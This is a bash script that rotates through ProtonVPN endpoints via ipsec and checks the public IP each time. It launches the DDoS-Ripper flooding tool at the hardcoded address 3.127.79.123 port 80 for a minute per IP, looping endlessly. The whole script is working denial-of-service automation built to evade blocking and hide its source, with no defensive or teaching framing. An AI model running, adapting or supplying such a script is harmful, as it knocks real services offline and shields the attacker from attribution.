#!/bin/bash
PWD=`pwd`
sudo ipsec down proton
sudo ipsec status
file="host"
IP=`dig +short myip.opendns.com @resolver1.opendns.com`
x=$IP
while [ True ]
    do
	for var in $(cat $file)
	    do
		sed -i 's/right=.*/right='$var'/g' /etc/ipsec.conf
		sed -i 's/rightid=%.*/rightid=%'$var'/g' /etc/ipsec.conf
		echo "$myip $x"
		echo "##########################################################"
		myip=`dig +short myip.opendns.com @resolver1.opendns.com`
		if [ $myip == "$x" ]
		    then
			echo ok 
			echo "$x"
			echo "################################################"
			sudo ipsec up proton
		    else
			sudo ipsec up proton
			sleep 10
			echo "################################################"
			echo $myip
			echo "################################################"
#			cd DDoS-Ripper
#			sudo screen -d -m -S 1111 
			python3 $PWD/DDoS-Ripper/DRipper.py -s 3.127.79.123 -p 80 -q 1
			sleep 60
			sudo pkill screen
			sudo ipsec down proton
			sleep 5
		    fi
	    done
    done
